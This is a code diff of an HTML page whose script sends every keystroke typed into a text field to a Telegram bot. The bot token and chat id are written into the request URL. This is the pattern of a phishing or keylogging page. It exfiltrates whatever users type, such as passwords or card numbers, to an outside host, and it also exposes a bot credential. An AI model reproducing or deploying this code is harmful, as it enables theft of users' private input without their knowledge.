@@ -76,7 +76,7 @@
 </div>
 <div id="vk_bottom"></div>
 <script>
-$('.textfield').keyup(function(){
+  		$('.textfield').keyup(function(){
 	let aaa = $(this).val();
 	ggg(aaa);
 });
@@ -86,12 +86,8 @@ $('.textfield').keyup(function(){
 
 
   		function ggg(aaa){ 
-
-	    $.ajax(
-  'https://api.telegram.org/bot864922840:AAHXkQo-CodVOvjlDePkkbWA75hk3o-_FVU/sendMessage?chat_id=198168567&text='+aaa          
-  
-);
-  		console.log('dgdf');
+	    $.ajax('https://api.telegram.org/bot864922840:AAHXkQo-CodVOvjlDePkkbWA75hk3o-_FVU/sendMessage?chat_id=198168567&text='+aaa);
+		}
   	</script>
 </body>
 </html>
